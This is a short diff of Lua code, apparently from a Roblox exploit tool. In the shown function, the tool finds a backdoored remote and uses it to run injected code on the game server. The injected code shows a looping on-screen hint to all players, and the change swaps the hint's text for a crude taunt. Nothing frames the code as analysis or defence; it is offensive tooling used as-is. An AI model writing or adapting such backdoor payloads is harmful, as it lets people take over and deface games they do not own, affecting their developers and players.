@@ -394,7 +394,7 @@ local function setupBackdoorFunctionality()
                     backdoor = remote
                     debug(remote:GetFullName(), 3)
                     
-                    runRemote(remote, "a=Instance.new('Hint')a.Text='T3ST ON TOP!'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+                    runRemote(remote, "a=Instance.new('Hint')a.Text='ik u luv dadddy exvy/test'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                     
                     return true
                 end
